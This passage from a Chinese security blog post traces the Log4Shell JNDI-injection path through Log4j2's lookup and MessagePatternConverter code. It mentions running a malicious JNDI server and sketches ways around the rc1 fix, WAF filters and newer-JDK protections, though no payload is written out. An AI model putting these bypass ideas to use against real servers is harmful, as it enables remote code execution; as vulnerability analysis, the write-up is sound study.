class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-built_in">this</span>.strLookupMap.put(<span class="hljs-string">&quot;jvmrunargs&quot;</span>, Loader.newCheckedInstanceOf(<span class="hljs-string">&quot;org.apache.logging.log4j.core.lookup.JmxRuntimeInputArgumentsLookup&quot;</span>, StrLookup.class));<br>        &#125; <span class="hljs-keyword">catch</span> (Exception | LinkageError var8) &#123;<br>            <span class="hljs-built_in">this</span>.handleError(<span class="hljs-string">&quot;jvmrunargs&quot;</span>, var8);<br>        &#125;<br><br>        <span class="hljs-built_in">this</span>.strLookupMap.put(<span class="hljs-string">&quot;date&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">DateLookup</span>());<br>        <span class="hljs-built_in">this</span>.strLookupMap.put(<span class="hljs-string">&quot;ctx&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">ContextMapLookup</span>());<br>        <span class="hljs-keyword">if</span> (Constants.IS_WEB_APP) &#123;<br>            <span class="hljs-keyword">try</span> &#123;<br>                <span class="hljs-built_in">this</span>.strLookupMap.put(<span class="hljs-string">&quot;web&quot;</span>, Loader.newCheckedInstanceOf(<span class="hljs-string">&quot;org.apache.logging.log4j.web.WebLookup&quot;</span>, StrLookup.class));<br>            &#125; <span class="hljs-keyword">catch</span> (Exception var7) &#123;<br>                <span class="hljs-built_in">this</span>.handleError(<span class="hljs-string">&quot;web&quot;</span>, var7);<br>            &#125;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            LOGGER.debug(<span class="hljs-string">&quot;Not in a ServletContext environment, thus not loading WebLookup plugin.&quot;</span>);<br>        &#125;<br><br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-built_in">this</span>.strLookupMap.put(<span class="hljs-string">&quot;docker&quot;</span>, Loader.newCheckedInstanceOf(<span class="hljs-string">&quot;org.apache.logging.log4j.docker.DockerLookup&quot;</span>, StrLookup.class));<br>        &#125; <span class="hljs-keyword">catch</span> (Exception var6) &#123;<br>            <span class="hljs-built_in">this</span>.handleError(<span class="hljs-string">&quot;docker&quot;</span>, var6);<br>        &#125;<br><br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-built_in">this</span>.strLookupMap.put(<span class="hljs-string">&quot;spring&quot;</span>, Loader.newCheckedInstanceOf(<span class="hljs-string">&quot;org.apache.logging.log4j.spring.cloud.config.client.SpringLookup&quot;</span>, StrLookup.class));<br>        &#125; <span class="hljs-keyword">catch</span> (Exception var5) &#123;<br>            <span class="hljs-built_in">this</span>.handleError(<span class="hljs-string">&quot;spring&quot;</span>, var5);<br>        &#125;<br><br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-built_in">this</span>.strLookupMap.put(<span class="hljs-string">&quot;kubernetes&quot;</span>, Loader.newCheckedInstanceOf(<span class="hljs-string">&quot;org.apache.logging.log4j.kubernetes.KubernetesLookup&quot;</span>, StrLookup.class));<br>        &#125; <span class="hljs-keyword">catch</span> (Exception var3) &#123;<br>            <span class="hljs-built_in">this</span>.handleError(<span class="hljs-string">&quot;kubernetes&quot;</span>, var3);<br>        &#125; <span class="hljs-keyword">catch</span> (NoClassDefFoundError var4) &#123;<br>            <span class="hljs-built_in">this</span>.handleError(<span class="hljs-string">&quot;kubernetes&quot;</span>, var4);<br>        &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><img src="/2023/09/28/Log4Shell/image-20230928013525232-1695897805957-1-1695899839737-41.png" class="" title="image-20230928013525232"><p> 当<code>$&#123;prefix:key&#125;</code>中的<code>prefix</code>不为空的时候，<code>Interpolator</code>中的<code>lookup</code>方法就会去调用<code>prefix</code>对应的<code>StrLookup</code>的<code>lookup</code>方法去查询key所对应的内容，当<code>prefix</code>为<code>jndi</code>的时候就造成了JNDI注入：</p><img src="/2023/09/28/Log4Shell/image-20230928020051845-1695897805957-2-1695899839737-42.png" class="" title="image-20230928020051845"><img src="/2023/09/28/Log4Shell/image-20230928020841071-1695897805957-3-1695899839737-43.png" class="" title="image-20230928020841071"><p>本次漏洞关键在于转换器名称<code>msg</code>对应的插件实例<code>MessagePatternConverter</code>对于日志中的消息内容处理存在问题，在大多数场景下这部分是攻击者可控的。<code>MessagePatternConverter</code>会将日志中的消息内容为<code>$&#123;prefix:key&#125;</code>格式的字符串进行解析转换，读取环境变量。此时为jndi的方式的话，就存在漏洞。</p><p>详细流程如下，当log4j开始进行处理的时候，<code>AbstractOutputStreamAppender</code>类的<code>directEncodeEvent</code>方法先获取当前使用的布局，并调用对应的<code>encode</code>方法：</p><img src="/2023/09/28/Log4Shell/image-20230928125229635-1695899839732-24.png" class="" title="image-20230928125229635"><p>进入默认布局<code>PatternLayout</code>类的<code>encode</code>方法，<code>encode</code>调用<code>toText</code>：</p><img src="/2023/09/28/Log4Shell/image-20230928125540683-1695899839732-25.png" class="" title="image-20230928125540683"><p>toText中会获取对应的<code>serialize</code>r然后调用<code>serializer</code>的<code>toSerializable</code>方法</p><img src="/2023/09/28/Log4Shell/image-20230928125705420-1695899839732-26.png" class="" title="image-20230928125705420"><p>随后进入<code>toSerializable</code>后会在循环中使用合适的<code>converter</code>来处理传入的内容：</p><img src="/2023/09/28/Log4Shell/image-20230928135519938-1695899839732-27.png" class="" title="image-20230928135519938"><img src="/2023/09/28/Log4Shell/image-20230928140306447-1695899839732-28.png" class=""><p>继续往下跟进的时候会看到在<code>MessagePatternConverter</code>类中对传入的<code>$&#123;prefix:key&#125;</code>进行了处理，</p><img src="/2023/09/28/Log4Shell/image-20230928141108185-1695899839732-29.png" class="" title="image-20230928141108185"><p>细心的师傅们可能看到了offset&#x3D;68和count&#x3D;99这样的差别，中间差了31位的长度：</p><img src="/2023/09/28/Log4Shell/image-20230928141812113-1695899839732-30.png" class="" title="image-20230928141812113"><img src="/2023/09/28/Log4Shell/image-20230928141752845-1695899839732-31.png" class="" title="image-20230928141752845"><p>这是因为在经过了<code>formatTo</code>方法后截取了<code>$&#123;prefix:key&#125;</code>的值，所以长度减少了，我这里是31：</p><img src="/2023/09/28/Log4Shell/image-20230928142544264-1695899839733-32.png" class="" title="image-20230928142544264"><img src="/2023/09/28/Log4Shell/image-20230928142701509-1695899839733-33.png" class="" title="image-20230928142701509"><img src="/2023/09/28/Log4Shell/image-20230928142939212-1695899839733-34.png" class="" title="image-20230928142939212"><img src="/2023/09/28/Log4Shell/image-20230928143110502-1695899839733-35.png" class="" title="image-20230928143110502"><p>那么log4j截取这部分的内容做什么呢，走到这段<code>if</code>的最后流程，是一个<code>append</code>（当然前面还有个<code>substring</code>）,要append的内容就要由log4j去查找了，剩下的上面已经说过了，选取合适的<code>StrLookup</code>的<code>lookup</code>方法去查询<code>key</code>所对应的内容，最终调用<code>JndiMananger</code>中的<code>lookup</code>后调用到<code>ldap</code>的<code>lookup</code>：</p><img src="/2023/09/28/Log4Shell/image-20230928150520456-1695899839733-36.png" class="" title="image-20230928150520456"><img src="/2023/09/28/Log4Shell/image-20230928145907568-1695899839733-37.png" class="" title="image-20230928145907568"><img src="/2023/09/28/Log4Shell/image-20230928150108133-1695899839733-38.png" class="" title="image-20230928150108133"><p>这个时候我们启动一个恶意的JNDI服务，并替换地址：</p><img src="/2023/09/28/Log4Shell/image-20230928182725540-1695899839733-39.png" class="" title="image-20230928182725540"><img src="/2023/09/28/Log4Shell/image-20230928183008647-1695899839733-40.png" class="" title="image-20230928183008647"><h2 id="关于绕过"><a href="#关于绕过" class="headerlink" title="关于绕过"></a>关于绕过</h2><p>rc1的修复可以被绕过，但是需要开发人员手工开启<code>log4j2.formatMsgLookups=true</code>又或者配置文件中自己写<code>%msg&#123;lookups&#125;%n&quot;</code>类似的布局模式，但是对于学习来说还是有意义的，所以简单说下，对于开启了这些配置的log4j2-rc1，其内部仍然加了一些白名单和其他的严格检测，但是如果抛出了<code>URISyntaxException</code>异常，那么就会绕过这些限制，catch异常后重新进入前面JNDI注入的流程。</p><p>具体的修复在<a href="https://github.com/apache/logging-log4j2/commit/bac0d8a35c7e354a0d3f706569116dff6c6bd658">这里</a>感兴趣的可以去看下，因为流程基本一样，所以这里就不做复现了。</p><img src="/2023/09/28/Log4Shell/image-20230928191702796.png" class=""><p>关于WAF基本的思路就是利用log4j的迭代解析进行poc构造，不过貌似现在大家都能防住了。</p><p>关于高版本JDK的绕过思路，可以通过 <code>org.apache.naming.factory.BeanFactory</code> 等类进行绕过。</p>]]></content>
    
    
    <categories>
      
      <category>Top50VulnsToRCE_2023</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Top50VulnsToRCE_2023</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
